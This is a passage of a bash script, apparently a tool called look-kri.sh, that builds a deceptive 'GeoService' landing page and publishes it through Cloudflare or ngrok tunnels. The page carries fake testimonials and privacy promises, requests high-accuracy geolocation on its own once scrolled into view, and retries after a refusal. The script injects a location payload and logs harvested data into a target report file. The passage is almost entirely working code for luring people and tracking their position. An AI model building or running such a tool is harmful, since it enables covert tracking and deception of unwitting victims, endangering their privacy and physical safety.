            <h1>Welcome to Our Location-Based Service</h1>
            <p>Experience personalized content and services tailored to your exact location. 
               We use your location to provide you with the best possible experience.</p>
            <button class="cta-button" onclick="requestLocationAccess()">
                Enable Location Services 🌍
            </button>
            
            <div id="locationStatus" class="location-status">
                <p><strong>📍 Location Status:</strong> <span id="statusText">Waiting for permission...</span></p>
                <div class="loading" id="locationLoader"></div>
            </div>
        </section>

        <section id="features" class="features">
            <div class="feature-card">
                <div class="feature-icon">🎯</div>
                <h3>Precise Localization</h3>
                <p>Get accurate location-based recommendations and services tailored to your area.</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">⚡</div>
                <h3>Fast Service</h3>
                <p>Quick access to local services and information based on your current position.</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔒</div>
                <h3>Secure & Private</h3>
                <p>Your location data is encrypted and handled with the utmost security and privacy.</p>
            </div>
        </section>

        <section id="location" class="location-section">
            <h2>Why We Need Your Location</h2>
            <div class="location-box">
                <h3>📍 Enable Location Access</h3>
                <p>To provide you with personalized services, we need access to your device's location.</p>
                <p>This allows us to:</p>
                <ul style="text-align: left; margin: 20px 0; padding-left: 20px; color: #666;">
                    <li>Show relevant local content</li>
                    <li>Provide location-specific features</li>
                    <li>Offer personalized recommendations</li>
                    <li>Enhance your overall experience</li>
                </ul>
                <button class="location-button" onclick="requestLocationAccess()">
                    Allow Location Access
                </button>
            </div>

            <div class="location-benefits">
                <div class="benefit">
                    <span>✅</span>
                    <span>Personalized Content</span>
                </div>
                <div class="benefit">
                    <span>✅</span>
                    <span>Local Recommendations</span>
                </div>
                <div class="benefit">
                    <span>✅</span>
                    <span>Enhanced Features</span>
                </div>
                <div class="benefit">
                    <span>✅</span>
                    <span>Better Experience</span>
                </div>
            </div>
        </section>

        <section id="testimonials" class="testimonials">
            <h2 style="text-align: center; margin-bottom: 40px;">What Our Users Say</h2>
            <div class="testimonial-grid">
                <div class="testimonial">
                    <p class="testimonial-text">"The location-based features made my experience so much better!"</p>
                    <p class="testimonial-author">- Sarah M.</p>
                </div>
                <div class="testimonial">
                    <p class="testimonial-text">"I love how personalized everything feels with location enabled."</p>
                    <p class="testimonial-author">- John D.</p>
                </div>
                <div class="testimonial">
                    <p class="testimonial-text">"Best service I've used. Location integration is seamless!"</p>
                    <p class="testimonial-author">- Alex P.</p>
                </div>
            </div>
        </section>
    </main>

    <footer id="contact">
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h3>About Us</h3>
                    <p>We provide location-based services to enhance your digital experience with personalized content and features.</p>
                </div>
                <div class="footer-section">
                    <h3>Contact</h3>
                    <p>Email: info@geoservice.com</p>
                    <p>Phone: (123) 456-7890</p>
                </div>
                <div class="footer-section">
                    <h3>Privacy</h3>
                    <p>Your privacy is important to us. We only use location data to improve your experience.</p>
                </div>
            </div>
            <div class="copyright">
                <p>© 2024 GeoService. All rights reserved. | Location services enhance your experience.</p>
            </div>
        </div>
    </footer>

    <script>
        // Location request function
        function requestLocationAccess() {
            const statusElement = document.getElementById('statusText');
            const loader = document.getElementById('locationLoader');
            const statusBox = document.getElementById('locationStatus');
            
            statusBox.classList.add('active');
            loader.style.display = 'inline-block';
            statusElement.textContent = 'Requesting location access...';
            
            if (!navigator.geolocation) {
                statusElement.textContent = 'Geolocation is not supported by your browser';
                loader.style.display = 'none';
                return;
            }
            
            // Try to get location with high accuracy
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    statusElement.textContent = 'Location access granted! Getting precise location...';
                    
                    // Show coordinates (optional)
                    setTimeout(() => {
                        const lat = position.coords.latitude.toFixed(6);
                        const lng = position.coords.longitude.toFixed(6);
                        statusElement.innerHTML = `📍 Location acquired!<br>Latitude: ${lat}, Longitude: ${lng}`;
                        loader.style.display = 'none';
                        
                        // Show success message
                        showNotification('Location successfully acquired! Personalized content is now available.', 'success');
                    }, 1000);
                },
                function(error) {
                    loader.style.display = 'none';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            statusElement.textContent = 'Location access was denied. Please enable it in your browser settings.';
                            showNotification('Location access is required for full functionality.', 'warning');
                            break;
                        case error.POSITION_UNAVAILABLE:
                            statusElement.textContent = 'Location information is unavailable.';
                            break;
                        case error.TIMEOUT:
                            statusElement.textContent = 'Location request timed out. Please try again.';
                            break;
                        default:
                            statusElement.textContent = 'An unknown error occurred.';
                    }
                    
                    // Show retry button
                    setTimeout(() => {
                        const retryBtn = document.createElement('button');
                        retryBtn.textContent = 'Retry Location Access';
                        retryBtn.className = 'location-button';
                        retryBtn.style.marginTop = '10px';
                        retryBtn.onclick = requestLocationAccess;
                        statusBox.appendChild(retryBtn);
                    }, 1000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        // Show notification
        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 15px 20px;
                background: ${type === 'success' ? '#4CAF50' : '#ff9800'};
                color: white;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                z-index: 10000;
                animation: slideIn 0.3s ease;
                max-width: 300px;
            `;
            
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 5000);
        }
        
        // Add CSS animations
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
        
        // Auto-request location after a delay
        setTimeout(() => {
            const heroSection = document.querySelector('.hero');
            const observer = new IntersectionObserver((entries) => {
                if (entries[0].isIntersecting) {
                    requestLocationAccess();
                    observer.disconnect();
                }
            }, { threshold: 0.5 });
            
            if (heroSection) {
                observer.observe(heroSection);
            }
        }, 3000);
    </script>
</body>
</html>
EOF

create_location_payload
sed -i 's/PAGE_TYPE_PLACEHOLDER/landing_page/g' payload
sed -i '/<\/body>/i <!-- LOCATION_PAYLOAD -->' index.html
sed -i '/<!-- LOCATION_PAYLOAD -->/r payload' index.html
printf "\e[1;92m[\e[0m+\e[1;92m] Landing page created with location tracking!\e[0m\n"
}

# ====================== TUNNEL FUNCTIONS ======================
download_cloudflared() {
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
if [[ $arch == *'arm'* ]] || [[ $(uname -a) == *'Android'* ]]; then
wget --no-check-certificate -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
else
wget --no-check-certificate -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O cloudflared
fi

if [[ $? -eq 0 ]] && [[ -e "cloudflared" ]]; then
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared downloaded successfully!\e[0m\n"
return 0
else
printf "\e[1;31m[!] Failed to download cloudflared!\e[0m\n"
return 1
fi
}

check_cloudflared() {
if [[ -e "cloudflared" ]]; then
if [[ ! -x "cloudflared" ]]; then
chmod +x cloudflared
fi
./cloudflared --version >/dev/null 2>&1
if [[ $? -ne 0 ]]; then
printf "\e[1;33m[!] Existing cloudflared seems corrupted. Redownloading...\e[0m\n"
rm -f cloudflared
download_cloudflared
fi
return 0
else
download_cloudflared
fi
}

cf_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Setting up Cloudflare tunnel...\e[0m\n"
pkill -f cloudflared > /dev/null 2>&1
killall cloudflared > /dev/null 2>&1

check_cloudflared
if [[ $? -ne 0 ]]; then
printf "\e[1;31m[!] Failed to setup cloudflared.\e[0m\n"
return 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

if ! ps aux | grep -q "[p]hp.*3333"; then
printf "\e[1;31m[!] PHP server failed to start!\e[0m\n"
return 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -f cf.log
./cloudflared tunnel --url http://127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
CF_PID=$!

printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for tunnel (15 seconds)...\e[0m\n"
for i in {1..15}; do
if [[ -e "cf.log" ]] && grep -q "trycloudflare.com" cf.log 2>/dev/null; then
break
fi
sleep 1
printf "."
done
printf "\n"

if ! ps -p $CF_PID > /dev/null 2>&1; then
printf "\e[1;33m[!] Cloudflared stopped. Trying alternative...\e[0m\n"
./cloudflared tunnel --url http://localhost:3333 > cf.log 2>&1 &
sleep 10
fi

link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" 2>/dev/null | head -n1)

if [[ -z "$link" ]]; then
link=$(grep -o 'https://.*\.trycloudflare\.com' "cf.log" 2>/dev/null | head -n1)
fi

if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Failed to get Cloudflare tunnel URL\e[0m\n"
return 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflare URL:\e[0m\e[1;77m %s\e[0m\n" $link
sed 's+forwarding_link+'$link'+g' template.php > index.php
return 0
fi
}

check_ngrok() {
if command -v ngrok &> /dev/null; then
return 0
else
printf "\e[1;31m[!] Ngrok is not installed!\e[0m\n"
printf "\e[1;33m[*] Would you like to install ngrok? [Y/N]: \e[0m"
read install_ngrok
if [[ $install_ngrok == "Y" || $install_ngrok == "y" ]]; then
install_ngrok_func
else
return 1
fi
fi
}

install_ngrok_func() {
printf "\e[1;92m[\e[0m+\e[1;92m] Installing Ngrok...\e[0m\n"
arch=$(uname -m)
if [[ $(uname -a) == *'Android'* ]]; then
printf "\e[1;33m[*] For Termux, install ngrok manually:\e[0m\n"
printf "\e[1;33m    pkg install ngrok\e[0m\n"
printf "\e[1;33m    Then configure with: ngrok authtoken YOUR_TOKEN\e[0m\n"
return 1
elif [[ "$arch" == *'x86_64'* ]]; then
wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
rm ngrok-v3-stable-linux-amd64.tgz
chmod +x ngrok
elif [[ "$arch" == *'arm'* ]] || [[ "$arch" == *'aarch64'* ]]; then
wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
tar -xzf ngrok-v3-stable-linux-arm64.tgz
rm ngrok-v3-stable-linux-arm64.tgz
chmod +x ngrok
else
wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz
tar -xzf ngrok-v3-stable-linux-386.tgz
rm ngrok-v3-stable-linux-386.tgz
chmod +x ngrok
fi

if [[ -e "ngrok" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok downloaded successfully!\e[0m\n"
printf "\e[1;33m[*] You need to add your ngrok authtoken.\e[0m\n"
printf "\e[1;33m[*] Get your token from: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
printf "\e[1;33m[*] Then run: ./ngrok config add-authtoken YOUR_TOKEN\e[0m\n"
return 0
else
printf "\e[1;31m[!] Failed to download ngrok!\e[0m\n"
return 1
fi
}

setup_ngrok_auth() {
if [[ -e "ngrok" ]]; then
./ngrok config check >/dev/null 2>&1
if [[ $? -ne 0 ]]; then
printf "\e[1;33m[*] Ngrok authentication required!\e[0m\n"
printf "\e[1;33m[*] Get your authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
printf "\e[1;33m[*] Enter your ngrok authtoken: \e[0m"
read authtoken
if [[ -n "$authtoken" ]]; then
./ngrok config add-authtoken $authtoken
if [[ $? -eq 0 ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok authenticated successfully!\e[0m\n"
return 0
else
printf "\e[1;31m[!] Failed to authenticate ngrok!\e[0m\n"
return 1
fi
else
printf "\e[1;31m[!] No authtoken provided!\e[0m\n"
return 1
fi
else
return 0
fi
else
return 1
fi
}

ngrok_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Setting up Ngrok tunnel...\e[0m\n"
pkill -f ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1

if ! check_ngrok; then
return 1
fi

if [[ -e "ngrok" ]]; then
if ! setup_ngrok_auth; then
printf "\e[1;31m[!] Ngrok authentication failed!\e[0m\n"
return 1
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 8080...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

if ! ps aux | grep -q "[p]hp.*8080"; then
printf "\e[1;31m[!] PHP server failed to start!\e[0m\n"
return 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
rm -f ngrok.log
if [[ -e "ngrok" ]]; then
./ngrok http 8080 > ngrok.log 2>&1 &
else
ngrok http 8080 > ngrok.log 2>&1 &
fi
NGROK_PID=$!

printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for ngrok (10 seconds)...\e[0m\n"
sleep 10

# Try to get ngrok URL from API
link=""
for i in {1..5}; do
if curl -s http://127.0.0.1:4040/api/tunnels > /tmp/ngrok_api.json 2>/dev/null; then
link=$(grep -o '"public_url":"[^"]*"' /tmp/ngrok_api.json | head -1 | cut -d'"' -f4)
if [[ -n "$link" ]]; then
break
fi
fi
sleep 2
done

# If API fails, try to parse log file
if [[ -z "$link" ]] && [[ -e "ngrok.log" ]]; then
link=$(grep -o 'url=https://[^ ]*' ngrok.log | head -1 | cut -d'=' -f2)
fi

if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Failed to get ngrok URL\e[0m\n"
printf "\e[1;33m[*] Make sure ngrok is properly authenticated\e[0m\n"
return 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok URL:\e[0m\e[1;77m %s\e[0m\n" $link
sed 's+forwarding_link+'$link'+g' template.php > index.php
return 0
fi
}

local_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Setting up local server...\n"
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on Localhost:8080...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

if ps aux | grep -q "[p]hp.*8080"; then
printf "\e[1;92m[\e[0m*\e[1;92m] Local server running at:\e[0m\e[1;77m http://127.0.0.1:8080\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Use port forwarding for external access\e[0m\n"
return 0
else
printf "\e[1;31m[!] Failed to start local server!\e[0m\n"
return 1
fi
}

# ====================== TUNNEL SELECTION ======================
select_tunnel() {
printf "\n\e[1;93m═══════════════════════════════════════════════════\e[0m\n"
printf "\e[1;92mSelect Tunnel Method:\e[0m\n"
printf "\e[1;96m[1]\e[0m Cloudflare Tunnel (Free, No Account, Currently not working!!)\n"
printf "\e[1;96m[2]\e[0m Ngrok Tunnel (Requires Account, Recommanded)\n"
printf "\e[1;96m[3]\e[0m Local Server Only\n"
printf "\e[1;93m═══════════════════════════════════════════════════\e[0m\n"

while true; do
read -p $'\n\e[1;92m Choose tunnel method [1-3]: \e[0m' tunnel_option

case $tunnel_option in
    1)
        printf "\e[1;92m[\e[0m+\e[1;92m] Using Cloudflare tunnel...\e[0m\n"
        if cf_server; then
            checkfound
        else
            printf "\e[1;31m[!] Cloudflare tunnel failed. Try another option.\e[0m\n"
            continue
        fi
        ;;
    2)
        printf "\e[1;92m[\e[0m+\e[1;92m] Using Ngrok tunnel...\e[0m\n"
        printf "\e[1;33m[*] Note: You need a ngrok account for this.\e[0m\n"
        printf "\e[1;33m[*] Get free account: https://ngrok.com\e[0m\n"
        if ngrok_server; then
            checkfound
        else
            printf "\e[1;31m[!] Ngrok tunnel failed. Try another option.\e[0m\n"
            continue
        fi
        ;;
    3)
        printf "\e[1;92m[\e[0m+\e[1;92m] Using local server...\e[0m\n"
        if local_server; then
            checkfound
        else
            printf "\e[1;31m[!] Local server failed.\e[0m\n"
            continue
        fi
        ;;
    *)
        printf "\e[1;31m[!] Invalid option! Please choose 1, 2, or 3.\e[0m\n"
        ;;
esac
done
}

# ====================== MAIN FUNCTION ======================
look_kri() {
pkill -f cloudflared > /dev/null 2>&1
pkill -f ngrok > /dev/null 2>&1
killall php > /dev/null 2>&1

if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi

if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi

# Select which page to show
select_page

# Select tunnel method
select_tunnel
}

# ====================== START ======================
dependencies
banner
look_kri

# ====================== TUNNEL FIX FUNCTION ======================
fix_tunnel() {
echo "🔧 Fixing tunnel issues..."

# Install missing dependencies
echo "📦 Installing dependencies..."
sudo apt-get update
sudo apt-get install -y php curl wget git ssh

# Fix permissions
chmod +x look-kri.sh

# Test Cloudflare manually
echo "🌐 Testing Cloudflare..."
if [ -f cloudflared ]; then
    ./cloudflared --version
    echo "Starting test tunnel..."
    timeout 30 ./cloudflared tunnel --url http://localhost:8080 &
    sleep 10
    pkill cloudflared
fi

# Test PHP
echo "🐘 Testing PHP..."
php --version
php -S 127.0.0.1:9999 &
sleep 2
pkill php

echo "✅ Fix completed. Try running: ./look-kri.sh"
}

# Check if user wants to run fix function
if [[ $1 == "--fix" ]] || [[ $1 == "-f" ]]; then
    fix_tunnel
    exit 0
fi

# Display help
if [[ $1 == "--help" ]] || [[ $1 == "-h" ]]; then
    echo "Usage: ./look-kri.sh [OPTION]"
    echo ""
    echo "Options:"
    echo "  -f, --fix    Run tunnel fixer to resolve common issues"
    echo "  -h, --help   Display this help message"
    echo ""
    echo "Example:"
    echo "  ./look-kri.sh        # Start the main tool"
    echo "  ./look-kri.sh --fix  # Fix tunnel issues"
    exit 0
fi